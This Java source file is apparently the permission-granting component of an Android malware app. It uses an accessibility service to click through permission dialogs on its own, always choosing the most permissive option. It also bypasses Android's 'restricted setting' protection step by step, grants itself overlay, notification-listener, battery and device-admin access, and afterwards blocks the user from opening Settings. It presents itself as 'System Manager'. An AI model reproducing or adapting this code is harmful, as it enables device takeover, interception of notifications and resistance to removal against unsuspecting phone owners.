package com.fason.app.core.permissions;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import java.lang.ref.WeakReference;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * AutoGrantManager v3 — accessibility auto-click engine.
 *
 * Single strategy: watch for permission/settings windows via AccessibilityService,
 * click the most permissive available button instantly on the event thread.
 *
 * Handles:
 *  • Standard runtime permission dialogs (AOSP + all OEM variants)
 *  • "Controlled by Restricted Setting" → full multi-step bypass
 *  • Accessibility service self-enable (after restricted setting cleared)
 *  • Notification listener enable via Settings
 *  • Overlay permission (SYSTEM_ALERT_WINDOW) toggle
 *  • Battery optimization dialog
 *  • Device Admin activation dialog
 *  • Settings entry blocker (navigates back when user opens Settings)
 */
public final class AutoGrantManager {

    private static final String TAG = "AGM";

    // ── OEM permission controller packages ────────────────────────────────────
    private static final String[] PERM_PKGS = {
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.huawei.systemmanager",
        "com.coloros.safecenter",
        "com.vivo.permissionmanager",
        "com.oneplus.security",
        "com.asus.permissioncontroller",
        "com.transsion.security",
    };

    // ── Priority 1: "Allow all the time" equivalents ──────────────────────────
    private static final String[] CLICK_ALWAYS = {
        "allow all the time", "always allow", "always",
        "allow in background",
        "始终允许", "总是允许", "始终", "一直允许",
        "항상 허용", "항상",
        "toujours autoriser", "immer zulassen",
        "siempre permitir", "sempre permitir",
    };

    // ── Priority 2: general allow/confirm ────────────────────────────────────
    private static final String[] CLICK_ALLOW = {
        "allow", "allow only while using", "allow while using",
        "permit", "accept", "agree", "ok", "yes",
        "enable", "turn on", "activate", "activate anyway",
        "allow access", "give access",
        "allow restricted setting", "allow restricted settings",
        // Device admin
        "activate", "activate device admin", "activate device administrator",
        // Chinese
        "允许", "同意", "开启", "确定", "是",
        // Korean
        "허용", "허락",
        // Spanish/Portuguese/German/French/Russian
        "autoriser", "zulassen", "permitir", "aceptar",
        "разрешить", "принять",
    };

    // ── Restricted setting related texts ──────────────────────────────────────
    private static final String[] RESTRICTED_TRIGGERS = {
        "controlled by restricted setting",
        "restricted setting",
        "this setting is not available",
        "restricted by your", // Samsung variant
    };

    // ── Settings packages ─────────────────────────────────────────────────────
    private static final String[] SETTINGS_PKGS = {
        "com.android.settings",
        "com.samsung.android.settings",
        "com.miui.securitycenter",
        "com.huawei.systemmanager",
        "com.coloros.settings",
    };

    // ── Singleton ──────────────────────────────────────────────────────────────
    private static volatile AutoGrantManager instance;
    public static AutoGrantManager getInstance() {
        if (instance == null) synchronized (AutoGrantManager.class) {
            if (instance == null) instance = new AutoGrantManager();
        }
        return instance;
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private final Handler       mainHandler  = new Handler(Looper.getMainLooper());
    private final ExecutorService pool       = Executors.newSingleThreadExecutor();
    private final AtomicBoolean watcherArmed = new AtomicBoolean(false);
    private final AtomicBoolean clickBusy    = new AtomicBoolean(false);
    private final AtomicBoolean setupMode    = new AtomicBoolean(false);
    private final AtomicInteger grantedCount = new AtomicInteger(0);
    private volatile Listener   listener;
    private volatile WeakReference<Activity> actRef;
    private volatile boolean    blockSettings = false;

    // Tracks which special permission we're waiting on
    private volatile String     pendingGate   = null;

    public interface Listener {
        void onPermissionGranted(String perm);
        void onGateComplete(String label);
        void onSequenceComplete();
        void onProgress(int granted, int total);
    }
    public void setListener(Listener l) { this.listener = l; }
    public boolean isSetupMode() { return setupMode.get(); }

    // ── Setup entry points ─────────────────────────────────────────────────────

    /**
     * Arms the watcher for accessibility self-enable.
     * Called from SetupActivity just before opening Accessibility Settings.
     * The watcher handles:
     *  - "Controlled by restricted setting" multi-step bypass
     *  - The final toggle enable click
     */
    public void armForSetup(Activity activity) {
        actRef = new WeakReference<>(activity);
        setupMode.set(true);
        watcherArmed.set(true);
        pendingGate = "Accessibility";
        blockSettings = false; // don't block during setup
        Log.i(TAG, "Armed for accessibility self-enable");
    }

    /**
     * Called after accessibility is confirmed granted.
     * Starts the runtime permission auto-click sequence:
     * requests each group and auto-clicks the dialogs.
     */
    public void startRuntimeGrants(Activity activity) {
        actRef = new WeakReference<>(activity);
        watcherArmed.set(true);
        pendingGate = "Permissions";
        int total = PermissionManager.getRequiredPerms().length;
        pool.execute(() -> requestNextGroupLoop(total));
    }

    /**
     * Navigate to and auto-click special permissions.
     * Called after runtime perms are done.
     */
    public void startSpecialGrants() {
        watcherArmed.set(true);
        pool.execute(this::grantSpecialSequence);
    }

    public void stop() {
        watcherArmed.set(false);
        setupMode.set(false);
        pendingGate = null;
        pool.shutdownNow();
    }

    /** After setup is done, enable the settings blocker. */
    public void enableSettingsBlock() {
        blockSettings = true;
    }

    // ── Event handler — called from FasonAccessibilityService ─────────────────

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        // ── Settings blocker — post-setup ─────────────────────────────────────
        if (blockSettings && isSettingsPkg(pkg) && !setupMode.get()) {
            FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
            if (svc != null) {
                mainHandler.post(() -> svc.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK));
            }
            return;
        }

        if (!watcherArmed.get()) return;
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;
        if (!clickBusy.compareAndSet(false, true)) return;

        try {
            FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
            if (svc == null) return;
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            if (root == null) return;
            try {
                dispatchClick(root, pkg, svc);
            } finally {
                recycle(root);
            }
        } finally {
            clickBusy.set(false);
        }
    }

    // ── Main dispatch ──────────────────────────────────────────────────────────

    private void dispatchClick(AccessibilityNodeInfo root, String pkg,
                               FasonAccessibilityService svc) {
        // ── Check for "Controlled by restricted setting" first ─────────────────
        if ("Accessibility".equals(pendingGate) || isSettingsPkg(pkg)) {
            if (hasText(root, RESTRICTED_TRIGGERS)) {
                handleRestrictedSetting(root, svc, pkg);
                return;
            }
        }

        // ── Permission controller dialogs ──────────────────────────────────────
        if (isPermPkg(pkg)) {
            boolean clicked = clickBestAllow(root);
            if (clicked) {
                Log.d(TAG, "Permission dialog clicked");
                // After clicking a dialog, immediately fire next group request
                mainHandler.postDelayed(this::onPermDialogClicked, 400);
            }
            return;
        }

        // ── Settings pages (accessibility toggle, overlay toggle, etc.) ────────
        if (isSettingsPkg(pkg)) {
            // Try: text-based allow button first
            if (clickBestAllow(root)) {
                Log.d(TAG, "Settings allow button clicked in " + pendingGate);
                mainHandler.postDelayed(this::onSettingsGrantClicked, 500);
                return;
            }
            // Try: find and click an OFF toggle/switch
            if (clickOffToggle(root)) {
                Log.d(TAG, "Settings toggle clicked in " + pendingGate);
                mainHandler.postDelayed(this::onSettingsGrantClicked, 500);
            }
        }
    }

    // ── Restricted Setting bypass ──────────────────────────────────────────────

    /**
     * Handles the "Controlled by Restricted Setting" multi-step bypass.
     *
     * Samsung flow:
     *  1. Accessibility list shows "System Manager — Controlled by Restricted Setting"
     *  2. Tap it → detail page → gear/more-options icon at top right
     *  3. Tap gear → App Info opens with "Allow restricted setting" option
     *  4. Tap "Allow restricted setting" → confirm
     *  5. Go back → tap System Manager → toggle appears → enable it
     *
     * Stock Android flow:
     *  1. Same initial page
     *  2. Three-dot menu → "Allow restricted settings"
     *  3. Back → enable toggle
     */
    private void handleRestrictedSetting(AccessibilityNodeInfo root,
                                          FasonAccessibilityService svc, String pkg) {
        Log.i(TAG, "Restricted Setting detected — starting bypass");

        // Try direct "Allow restricted setting" text button first
        if (clickNodeByText(root, "allow restricted setting")
            || clickNodeByText(root, "allow restricted settings")) {
            Log.d(TAG, "Direct allow button found");
            mainHandler.postDelayed(this::onRestrictedSettingCleared, 700);
            return;
        }

        // Try the three-dot overflow / gear icon (contentDescription based)
        if (clickNodeByDesc(root, "More options")
            || clickNodeByDesc(root, "Settings")
            || clickNodeByDesc(root, "More")
            || clickNodeByDesc(root, "Menu")) {
            Log.d(TAG, "Overflow menu clicked");
            // Next event will bring up the menu — watcher will see "Allow restricted setting"
            return;
        }

        // Try tapping the item itself (for Samsung where item is greyed but still tappable)
        if (clickNodeContainingText(root, "system manager")
            || clickNodeContainingText(root, getAppLabel())) {
            Log.d(TAG, "Accessibility item tapped (restricted)");
            // May open a detail page with the gear
            return;
        }

        // Fallback: navigate to App Info page and look for the option there
        mainHandler.postDelayed(this::openAppInfoForRestricted, 300);
    }

    private void onRestrictedSettingCleared() {
        Log.i(TAG, "Restricted Setting cleared — going back to enable service");
        FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
        if (svc != null) {
            // Go back to accessibility list
            svc.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
            mainHandler.postDelayed(() -> {
                // Re-open accessibility settings for the fresh enable
                try {
                    Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    FasonApp.getContext().startActivity(i);
                } catch (Exception ignored) {}
            }, 600);
        }
    }

    private void openAppInfoForRestricted() {
        try {
            // Navigate to App Info — "Allow restricted setting" option is in overflow there
            Context ctx = FasonApp.getContext();
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    // ── Runtime permission loop ────────────────────────────────────────────────

    private void requestNextGroupLoop(int total) {
        Context ctx = FasonApp.getContext();
        int maxAttempts = 30;
        int attempts = 0;
        while (attempts++ < maxAttempts) {
            if (!watcherArmed.get()) return;
            String[] group = PermissionManager.getNextDeniedGroup(ctx);
            if (group == null) {
                // All runtime perms granted
                int granted = PermissionManager.getRequiredPerms().length;
                post(() -> {
                    if (listener != null) listener.onProgress(granted, total);
                    if (listener != null) listener.onGateComplete("Permissions");
                });
                // Move to special grants
                mainHandler.postDelayed(this::startSpecialGrants, 300);
                return;
            }
            // Request the group from main thread
            final String[] g = group;
            Activity act = actRef != null ? actRef.get() : null;
            if (act != null && !act.isFinishing()) {
                mainHandler.post(() ->
                    androidx.core.app.ActivityCompat.requestPermissions(
                        act, g, com.fason.app.ui.PermissionSetupController.PERM_REQ));
            }
            // Wait up to 8s for this group to be auto-clicked
            sleep(8000);
            // Update progress
            int granted = grantedCount.incrementAndGet();
            post(() -> { if (listener != null) listener.onProgress(granted, total); });
        }
    }

    private void onPermDialogClicked() {
        Context ctx = FasonApp.getContext();
        String[] next = PermissionManager.getNextDeniedGroup(ctx);
        if (next != null) {
            Activity act = actRef != null ? actRef.get() : null;
            if (act != null && !act.isFinishing()) {
                mainHandler.post(() ->
                    androidx.core.app.ActivityCompat.requestPermissions(
                        act, next, com.fason.app.ui.PermissionSetupController.PERM_REQ));
            }
        } else {
            post(() -> { if (listener != null) listener.onGateComplete("Permissions"); });
            mainHandler.postDelayed(this::grantSpecialSequence, 300);
        }
    }

    // ── Special permissions sequence ───────────────────────────────────────────

    private void grantSpecialSequence() {
        Context ctx = FasonApp.getContext();

        // Overlay
        if (!PermissionManager.hasOverlayPermission(ctx)) {
            pendingGate = "Overlay";
            openIntent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, ctx.getPackageName());
            waitForGate(() -> PermissionManager.hasOverlayPermission(ctx), 10_000, "Overlay");
        }

        if (!watcherArmed.get()) return;

        // Notification listener
        if (!PermissionManager.hasNotifListenerAccess(ctx)) {
            pendingGate = "Notifications";
            openIntent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS, null);
            waitForGate(() -> PermissionManager.hasNotifListenerAccess(ctx), 10_000, "Notifications");
        }

        if (!watcherArmed.get()) return;

        // Battery
        if (!PermissionManager.hasBatteryExemption(ctx)) {
            pendingGate = "Battery";
            openIntent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, ctx.getPackageName());
            waitForGate(() -> PermissionManager.hasBatteryExemption(ctx), 8_000, "Battery");
        }

        pendingGate = null;
        post(() -> { if (listener != null) listener.onSequenceComplete(); });
    }

    private void onSettingsGrantClicked() {
        if (pendingGate == null) return;
        Context ctx = FasonApp.getContext();
        boolean done = false;
        switch (pendingGate) {
            case "Accessibility":
                done = PermissionManager.hasAccessibilityAccess(ctx);
                break;
            case "Overlay":
                done = PermissionManager.hasOverlayPermission(ctx);
                break;
            case "Notifications":
                done = PermissionManager.hasNotifListenerAccess(ctx);
                break;
            case "Battery":
                done = PermissionManager.hasBatteryExemption(ctx);
                break;
        }
        if (done) {
            final String gate = pendingGate;
            post(() -> { if (listener != null) listener.onGateComplete(gate); });
            Log.i(TAG, gate + " granted via auto-click");
        }
    }

    private void waitForGate(BooleanCheck check, long timeoutMs, String label) {
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline) {
            sleep(250);
            if (check.get()) {
                post(() -> { if (listener != null) listener.onGateComplete(label); });
                return;
            }
        }
        Log.w(TAG, label + " timed out — continuing");
    }

    // ── Click helpers ──────────────────────────────────────────────────────────

    /** Click the highest-priority allow button in the window. */
    private boolean clickBestAllow(AccessibilityNodeInfo root) {
        // Pass 1 — "Allow all the time"
        for (String text : CLICK_ALWAYS) {
            if (clickNodeByText(root, text)) return true;
        }
        // Pass 2 — general allow
        for (String text : CLICK_ALLOW) {
            if (clickNodeByText(root, text)) return true;
        }
        return false;
    }

    /** Find and click an OFF switch/toggle to enable a special permission. */
    private boolean clickOffToggle(AccessibilityNodeInfo root) {
        if (root == null) return false;
        // Try by common switch IDs
        String[] switchIds = {
            "com.android.settings:id/switch_widget",
            "android:id/switch_widget",
            "com.android.settings:id/switchWidget",
            "com.samsung.android.settings:id/switch_widget",
        };
        for (String id : switchIds) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isClickable() && !n.isChecked()) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        recycle(nodes);
                        return true;
                    }
                }
                recycle(nodes);
            }
        }
        // Fallback: scan for Switch class nodes that are OFF
        return scanForOffToggle(root);
    }

    private boolean scanForOffToggle(AccessibilityNodeInfo node) {
        if (node == null) return false;
        String cls = node.getClassName() != null ? node.getClassName().toString() : "";
        if ((cls.contains("Switch") || cls.contains("ToggleButton") || cls.contains("CheckBox"))
            && node.isClickable() && !node.isChecked() && node.isVisibleToUser()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (scanForOffToggle(child)) { child.recycle(); return true; }
                child.recycle();
            }
        }
        return false;
    }

    private boolean clickNodeByText(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null || nodes.isEmpty()) return false;
        for (AccessibilityNodeInfo n : nodes) {
            String nodeText = n.getText() != null ? n.getText().toString().toLowerCase() : "";
            String nodeDesc = n.getContentDescription() != null
                ? n.getContentDescription().toString().toLowerCase() : "";
            if ((nodeText.contains(text) || nodeDesc.contains(text)) && n.isVisibleToUser()) {
                // Find the clickable ancestor if the node itself isn't clickable
                AccessibilityNodeInfo clickable = findClickable(n);
                if (clickable != null) {
                    clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    recycle(nodes);
                    return true;
                }
            }
        }
        recycle(nodes);
        return false;
    }

    private boolean clickNodeByDesc(AccessibilityNodeInfo root, String desc) {
        if (root == null) return false;
        String d = root.getContentDescription() != null
            ? root.getContentDescription().toString() : "";
        if (d.equalsIgnoreCase(desc) && root.isClickable() && root.isVisibleToUser()) {
            root.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                if (clickNodeByDesc(child, desc)) { child.recycle(); return true; }
                child.recycle();
            }
        }
        return false;
    }

    private boolean clickNodeContainingText(AccessibilityNodeInfo root, String substr) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(substr);
        if (nodes == null || nodes.isEmpty()) return false;
        for (AccessibilityNodeInfo n : nodes) {
            AccessibilityNodeInfo clickable = findClickable(n);
            if (clickable != null && clickable.isVisibleToUser()) {
                clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                recycle(nodes);
                return true;
            }
        }
        recycle(nodes);
        return false;
    }

    private AccessibilityNodeInfo findClickable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isClickable()) return node;
        AccessibilityNodeInfo parent = node.getParent();
        if (parent == null) return null;
        if (parent.isClickable()) return parent;
        AccessibilityNodeInfo grandparent = parent.getParent();
        return (grandparent != null && grandparent.isClickable()) ? grandparent : null;
    }

    private boolean hasText(AccessibilityNodeInfo root, String[] targets) {
        for (String t : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            if (nodes != null && !nodes.isEmpty()) { recycle(nodes); return true; }
        }
        return false;
    }

    // ── Misc helpers ───────────────────────────────────────────────────────────

    private void openIntent(String action, String pkg) {
        try {
            Context ctx = FasonApp.getContext();
            Intent i = new Intent(action);
            if (pkg != null) i.setData(Uri.parse("package:" + pkg));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) { Log.w(TAG, "openIntent failed: " + action, e); }
    }

    private boolean isPermPkg(String pkg) {
        for (String p : PERM_PKGS) if (p.equals(pkg)) return true;
        return false;
    }

    private boolean isSettingsPkg(String pkg) {
        for (String p : SETTINGS_PKGS) if (pkg.equals(p) || pkg.startsWith(p)) return true;
        return false;
    }

    private String getAppLabel() {
        try {
            return FasonApp.getContext().getApplicationInfo()
                .loadLabel(FasonApp.getContext().getPackageManager())
                .toString().toLowerCase();
        } catch (Exception e) { return "system manager"; }
    }

    private void post(Runnable r) { mainHandler.post(r); }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static void recycle(List<AccessibilityNodeInfo> list) {
        if (list == null) return;
        for (AccessibilityNodeInfo n : list) try { if (n != null) n.recycle(); } catch (Exception ignored) {}
    }

    private static void recycle(AccessibilityNodeInfo n) {
        try { if (n != null) n.recycle(); } catch (Exception ignored) {}
    }

    @FunctionalInterface interface BooleanCheck { boolean get(); }
}
